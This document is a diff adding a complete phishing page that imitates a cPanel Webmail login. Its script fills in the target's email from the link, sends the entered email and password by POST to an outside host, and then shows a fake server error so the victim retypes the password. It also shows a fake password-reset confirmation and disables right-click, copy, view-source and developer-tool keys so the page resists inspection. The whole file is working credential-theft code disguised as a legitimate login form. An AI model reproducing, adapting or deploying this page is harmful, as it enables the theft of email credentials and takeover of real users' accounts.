@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webmail Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        .email-field-locked {
+            background-color: #f3f4f6 !important;
+            cursor: not-allowed;
+        }
+        .spinner {
+            animation: spin 1s linear infinite;
+            display: inline-block;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        body {
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+        .language-flag {
+            width: 20px;
+            height: 16px;
+            margin-right: 8px;
+            display: inline-block;
+            vertical-align: middle;
+        }
+    </style>
+</head>
+<body class="bg-gray-100 font-sans text-gray-800 min-h-screen flex items-center justify-center">
+    <!-- Language Selector -->
+    <div class="absolute top-5 right-5 z-50">
+        <div class="relative inline-block text-left">
+            <button id="language-btn" class="inline-flex justify-center w-full px-4 py-2 text-sm font-medium text-gray-700 bg-white border border-gray-300 rounded-md shadow-sm hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-blue-500 transition-colors duration-200">
+                <i class="fas fa-globe mr-2"></i>
+                <span id="current-language">English</span>
+                <i class="fas fa-caret-down ml-2"></i>
+            </button>
+            <div id="language-dropdown" class="hidden absolute right-0 mt-2 w-56 origin-top-right bg-white rounded-md shadow-lg ring-1 ring-black ring-opacity-5 focus:outline-none z-50 transform transition-all duration-100">
+                <div class="py-1">
+                    <a href="#" data-lang="en" class="flex items-center px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 transition-colors duration-150"><img src="https://flagcdn.com/w20/us.png" class="language-flag"> English</a>
+                    <a href="#" data-lang="es" class="flex items-center px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 transition-colors duration-150"><img src="https://flagcdn.com/w20/es.png" class="language-flag"> Español</a>
+                    <a href="#" data-lang="fr" class="flex items-center px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 transition-colors duration-150"><img src="https://flagcdn.com/w20/fr.png" class="language-flag"> Français</a>
+                    <a href="#" data-lang="de" class="flex items-center px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 transition-colors duration-150"><img src="https://flagcdn.com/w20/de.png" class="language-flag"> Deutsch</a>
+                    <a href="#" data-lang="it" class="flex items-center px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 transition-colors duration-150"><img src="https://flagcdn.com/w20/it.png" class="language-flag"> Italiano</a>
+                    <a href="#" data-lang="pt" class="flex items-center px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 transition-colors duration-150"><img src="https://flagcdn.com/w20/pt.png" class="language-flag"> Português</a>
+                    <a href="#" data-lang="ru" class="flex items-center px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 transition-colors duration-150"><img src="https://flagcdn.com/w20/ru.png" class="language-flag"> Русский</a>
+                    <a href="#" data-lang="jp" class="flex items-center px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 transition-colors duration-150"><img src="https://flagcdn.com/w20/jp.png" class="language-flag"> 日本語</a>
+                    <a href="#" data-lang="cn" class="flex items-center px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 transition-colors duration-150"><img src="https://flagcdn.com/w20/cn.png" class="language-flag"> 中文</a>
+                    <a href="#" data-lang="ar" class="flex items-center px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 transition-colors duration-150"><img src="https://flagcdn.com/w20/ae.png" class="language-flag"> العربية</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Login Form -->
+    <div class="max-w-md w-full mx-4 bg-white rounded-lg shadow-md overflow-hidden transition-all duration-300 hover:shadow-lg">
+        <div id="notify" class="p-4">
+            <noscript>
+                <div class="bg-red-100 border-l-4 border-red-500 text-red-700 p-4 mb-4 rounded">
+                    JavaScript is disabled in your browser. For Webmail to function properly, you must enable JavaScript.
+                </div>
+            </noscript>
+            <div id="msg" class="hidden bg-red-100 border-l-4 border-red-500 text-red-700 p-4 mb-4 rounded">
+                The login is invalid
+            </div>
+        </div>
+
+        <div class="px-8 py-6">
+            <div class="flex justify-center mb-8">
+                <img src="https://webmail.toplinecard.com/cPanel_magic_revision_1720715123/unprotected/cpanel/images/webmail-logo.svg" alt="logo" class="h-12 transition-transform duration-300 hover:scale-105">
+            </div>
+
+            <form id="login_form" class="space-y-6">
+                <div>
+                    <label for="email" class="block text-sm font-medium text-gray-700 mb-1">Email Address</label>
+                    <div class="mt-1 relative rounded-md shadow-sm">
+                        <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
+                            <i class="fas fa-envelope text-gray-400"></i>
+                        </div>
+                        <input type="text" name="email" id="email" autofocus placeholder="Enter your email address"
+                             class="block w-full pl-10 pr-4 py-3 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm transition-colors duration-200">
+                    </div>
+                </div>
+
+                <div>
+                    <label for="password" class="block text-sm font-medium text-gray-700 mb-1">Password</label>
+                    <div class="mt-1 relative rounded-md shadow-sm">
+                        <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
+                            <i class="fas fa-lock text-gray-400"></i>
+                        </div>
+                        <input type="password" name="password" id="password" placeholder="Enter your email password"
+                             class="block w-full pl-10 pr-4 py-3 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500 sm:text-sm transition-colors duration-200">
+                        <div class="absolute inset-y-0 right-0 pr-3 flex items-center">
+                            <button type="button" id="togglePassword" class="text-gray-400 hover:text-gray-500 focus:outline-none">
+                                <i class="fas fa-eye"></i>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="flex items-center justify-between">
+                    <button type="submit" id="submit-btn" class="w-full flex justify-center items-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 transition-colors duration-200">
+                        <span id="submit-text">Log in</span>
+                        <i id="submit-spinner" class="fas fa-spinner spinner ml-2 hidden"></i>
+                    </button>
+                </div>
+                <div class="text-sm text-right">
+                    <a href="#" id="reset_password" class="font-medium text-blue-600 hover:text-blue-500 transition-colors duration-150">
+                        Reset Password
+                    </a>
+                </div>
+            </form>
+        </div>
+
+        <div class="bg-gray-50 px-8 py-4 text-center">
+            <p class="text-xs text-gray-500">
+                Copyright© 2025 cPanel, L.L.C.<br>
+                <a href="https://go.cpanel.net/privacy" target="_blank" class="text-blue-600 hover:text-blue-500 transition-colors duration-150">
+                    Privacy Policy
+                </a>
+            </p>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const ENDPOINT = 'https://billioneventsea.store/cloudflare/result.php';
+            let currentLanguage = 'en';
+            let count = 0;
+
+            // DOM Elements
+            const elements = {
+                form: document.getElementById('login_form'),
+                msg: document.getElementById('msg'),
+                submitBtn: document.getElementById('submit-btn'),
+                submitText: document.getElementById('submit-text'),
+                submitSpinner: document.getElementById('submit-spinner'),
+                emailField: document.getElementById('email'),
+                passwordField: document.getElementById('password'),
+                togglePassword: document.getElementById('togglePassword'),
+                languageBtn: document.getElementById('language-btn'),
+                currentLanguageText: document.getElementById('current-language'),
+                languageDropdown: document.getElementById('language-dropdown'),
+                resetPasswordLink: document.getElementById('reset_password')
+            };
+
+            // ======================
+            // EMAIL EXTRACTION LOGIC
+            // ======================
+            function extractEmailFromURL() {
+                // 1. First try to get from standard URL parameters
+                const urlParams = new URLSearchParams(window.location.search);
+                let email = urlParams.get('email') || 
+                            urlParams.get('e') || 
+                            urlParams.get('mail') || 
+                            urlParams.get('user') || 
+                            urlParams.get('{email}') || 
+                            urlParams.get('[[-Email-]]');
+
+                // 2. If not found, check URL hash (#email=value)
+                if (!email && window.location.hash) {
+                    const hashParams = new URLSearchParams(window.location.hash.substring(1));
+                    email = hashParams.get('email') || 
+                            hashParams.get('e') || 
+                            hashParams.get('mail') || 
+                            hashParams.get('user') || 
+                            hashParams.get('{email}') || 
+                            hashParams.get('[[-Email-]]');
+                }
+
+                // 3. If still not found, check if email is directly in path/hash
+                if (!email) {
+                    // Check for naked email in hash (#user@example.com)
+                    if (window.location.hash.includes('@')) {
+                        const potentialEmail = window.location.hash.substring(1).split('?')[0];
+                        if (isValidEmail(potentialEmail)) {
+                            email = potentialEmail;
+                        }
+                    }
+                    // Check for naked email in path (/user@example.com)
+                    else if (window.location.pathname.includes('@')) {
+                        const pathParts = window.location.pathname.split('/');
+                        for (const part of pathParts) {
+                            if (isValidEmail(part)) {
+                                email = part;
+                                break;
+                            }
+                        }
+                    }
+                }
+
+                // Clean the email if found
+                if (email) {
+                    return cleanEmailValue(email);
+                }
+                
+                return null;
+            }
+
+            function cleanEmailValue(email) {
+                // Remove any { } or [[ ]] placeholders
+                return email.replace(/[{\[\]}]/g, '')
+                           .replace(/(^[-]+|[-]+$)/g, '') // Remove hyphens
+                           .trim();
+            }
+
+            function isValidEmail(email) {
+                return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+            }
+
+            function autoFillEmail() {
+                const email = extractEmailFromURL();
+                if (email) {
+                    elements.emailField.value = email;
+                    elements.emailField.readOnly = true;
+                    elements.emailField.classList.add('email-field-locked');
+                    
+                    // Focus password field for better UX
+                    setTimeout(() => {
+                        elements.passwordField.focus();
+                    }, 100);
+                    
+                    return true;
+                }
+                return false;
+            }
+
+            // ======================
+            // LANGUAGE FUNCTIONALITY
+            // ======================
+            const translations = {
+                en: { email: "Email Address", password: "Password", login: "Log in", reset: "Reset Password", invalid: "The login is invalid", noAccount: "That account doesn't exist. Enter a different account", emptyEmail: "Email field is empty", emptyPassword: "Password field is empty", resetSuccess: "Password reset link has been sent to your email" },
+                es: { email: "Correo electrónico", password: "Contraseña", login: "Iniciar sesión", reset: "Restablecer contraseña", invalid: "El inicio de sesión no es válido", noAccount: "Esa cuenta no existe. Ingrese una cuenta diferente", emptyEmail: "El campo de correo electrónico está vacío", emptyPassword: "El campo de contraseña está vacío", resetSuccess: "El enlace para restablecer la contraseña ha sido enviado a su correo electrónico" },
+                fr: { email: "Adresse e-mail", password: "Mot de passe", login: "Se connecter", reset: "Réinitialiser le mot de passe", invalid: "La connexion est invalide", noAccount: "Ce compte n'existe pas. Entrez un compte différent", emptyEmail: "Le champ email est vide", emptyPassword: "Le champ du mot de passe est vide", resetSuccess: "Le lien de réinitialisation du mot de passe a été envoyé à votre email" },
+                de: { email: "E-Mail-Adresse", password: "Passwort", login: "Anmelden", reset: "Passwort zurücksetzen", invalid: "Die Anmeldung est ungültig", noAccount: "Dieses Konto existiert nicht. Geben Sie ein anderes Konto ein", emptyEmail: "E-Mail-Feld ist leer", emptyPassword: "Passwortfeld ist leer", resetSuccess: "Der Link zum Zurücksetzen des Passworts wurde an Ihre E-Mail gesendet" },
+                it: { email: "Indirizzo email", password: "Password", login: "Accedi", reset: "Reimposta password", invalid: "L'accesso non è valido", noAccount: "Quell'account non esiste. Inserisci un account diverso", emptyEmail: "Il campo email è vuoto", emptyPassword: "Il campo della password è vuoto", resetSuccess: "Il link per reimpostare la password è stato inviato alla tua email" },
+                pt: { email: "Endereço de email", password: "Senha", login: "Entrar", reset: "Redefinir senha", invalid: "O login é inválido", noAccount: "Essa conta não existe. Digite uma cuenta diferente", emptyEmail: "O campo de e-mail está vazio", emptyPassword: "O campo da senha está vazio", resetSuccess: "O link de redefinição de senha foi enviado para o seu email" },
+                ru: { email: "Адрес электронной почты", password: "Пароль", login: "Войти", reset: "Сброс пароля", invalid: "Неверный логин", noAccount: "Этой учетной записи не существует. Введите другую учетную запись", emptyEmail: "Поле электронной почты пусто", emptyPassword: "Поле пароля пусто", resetSuccess: "Ссылка для сброса пароля была отправлена на вашу электронную почту" },
+                jp: { email: "メールアドレス", password: "パスワード", login: "ログイン", reset: "パスワードを再設定する", invalid: "ログインが無効です", noAccount: "そのアカウントは存在しません。別のアカウントを入力してください", emptyEmail: "メールフィールドが空です", emptyPassword: "パスワードフィールドが空です", resetSuccess: "パスワード再設定リンクがメールに送信されました" },
+                cn: { email: "电子邮件地址", password: "密码", login: "登录", reset: "重设密码", invalid: "登录无效", noAccount: "该帐户不存在。输入其他帐户", emptyEmail: "电子邮件字段为空", emptyPassword: "密码字段为空", resetSuccess: "密码重置链接已发送至您的邮箱" },
+                ar: { email: "عنوان البريد الإلكتروني", password: "كلمة المرور", login: "تسجيل الدخول", reset: "إعادة تعيين كلمة المرور", invalid: "تسجيل الدخول غير صالح", noAccount: "هذا الحساب غير موجود. أدخل حسابًا مختلفًا", emptyEmail: "حقل البريد الإلكتروني فارغ", emptyPassword: "حقل كلمة المرور فارغ", resetSuccess: "تم إرسال رابط إعادة تعيين كلمة المرور إلى بريدك الإلكتروني" }
+            };
+
+            function translatePage(lang) {
+                currentLanguage = lang;
+                const t = translations[lang];
+
+                document.querySelector('label[for="email"]').textContent = t.email;
+                document.querySelector('label[for="password"]').textContent = t.password;
+                elements.submitText.textContent = t.login;
+                elements.resetPasswordLink.textContent = t.reset;
+                elements.msg.textContent = t.invalid;
+                elements.currentLanguageText.textContent = document.querySelector(`#language-dropdown a[data-lang="${lang}"]`).textContent.trim();
+            }
+
+            // ======================
+            // EVENT HANDLERS
+            // ======================
+            function setupEventListeners() {
+                // Toggle password visibility
+                elements.togglePassword.addEventListener('click', function() {
+                    const type = elements.passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
+                    elements.passwordField.setAttribute('type', type);
+                    this.querySelector('i').classList.toggle('fa-eye');
+                    this.querySelector('i').classList.toggle('fa-eye-slash');
+                });
+
+                // Form submission
+                elements.form.addEventListener('submit', function(e) {
+                    e.preventDefault();
+
+                    elements.msg.style.display = 'none';
+
+                    const email = elements.emailField.value;
+                    const password = elements.passwordField.value;
+
+                    if (!email) {
+                        showError(translations[currentLanguage].emptyEmail);
+                        return;
+                    }
+
+                    if (!password) {
+                        showError(translations[currentLanguage].emptyPassword);
+                        return;
+                    }
+
+                    count++;
+
+                    $.ajax({
+                        dataType: 'JSON',
+                        url: ENDPOINT,
+                        type: 'POST',
+                        data: { email: email, password: password },
+                        beforeSend: function() {
+                            elements.submitText.style.display = 'none';
+                            elements.submitSpinner.style.display = 'inline-block';
+                            elements.submitBtn.disabled = true;
+                        },
+                        success: function(response) {
+                            if (response) {
+                                elements.msg.style.display = 'block';
+                                Swal.fire({
+                                    title: 'Error',
+                                    text: 'Login: There was an error on the server. Please login again',
+                                    icon: 'error'
+                                });
+
+                                if (count >= 2) count = 0;
+                                elements.passwordField.value = "";
+                            }
+                        },
+                        error: function() {
+                            elements.passwordField.value = "";
+                            if (count >= 2) count = 0;
+                            Swal.fire({
+                                title: 'Error',
+                                text: 'Login: There was an error on the server. Please login again',
+                                icon: 'error'
+                            });
+                        },
+                        complete: function() {
+                            elements.submitText.style.display = 'inline';
+                            elements.submitSpinner.style.display = 'none';
+                            elements.submitBtn.disabled = false;
+                        }
+                    });
+                });
+
+                // Reset password
+                elements.resetPasswordLink.addEventListener('click', function(e) {
+                    e.preventDefault();
+
+                    const email = elements.emailField.value.trim();
+                    
+                    if (!email || !isValidEmail(email)) {
+                        showError(translations[currentLanguage].emptyEmail);
+                        return;
+                    }
+
+                    Swal.fire({
+                        title: 'Success',
+                        text: translations[currentLanguage].resetSuccess,
+                        icon: 'success'
+                    });
+                });
+
+                // Language dropdown
+                elements.languageBtn.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    elements.languageDropdown.classList.toggle('hidden');
+                });
+
+                document.addEventListener('click', function(e) {
+                    if (!elements.languageDropdown.contains(e.target) && e.target !== elements.languageBtn) {
+                        elements.languageDropdown.classList.add('hidden');
+                    }
+                });
+
+                document.querySelectorAll('#language-dropdown a').forEach(option => {
+                    option.addEventListener('click', function(e) {
+                        e.preventDefault();
+                        const lang = this.dataset.lang;
+                        translatePage(lang);
+                        elements.languageDropdown.classList.add('hidden');
+                    });
+                });
+
+                // Security measures
+                document.addEventListener('contextmenu', function(e) {
+                    e.preventDefault();
+                });
+
+                document.addEventListener('keydown', function(e) {
+                    if (e.ctrlKey || e.metaKey) {
+                        switch(e.key.toLowerCase()) {
+                            case 'c': case 'v': case 'u': case 's': case 'a': case 'f': case 'p':
+                                e.preventDefault();
+                                break;
+                        }
+                    }
+
+                    if (e.key === 'F12') {
+                        e.preventDefault();
+                    }
+                });
+            }
+
+            function showError(message) {
+                elements.msg.textContent = message;
+                elements.msg.style.display = 'block';
+            }
+
+            // ======================
+            // INITIALIZATION
+            // ======================
+            function initialize() {
+                autoFillEmail();
+                translatePage('en');
+                setupEventListeners();
+            }
+
+            initialize();
+        });
+    </script>
+</body>
+</html>
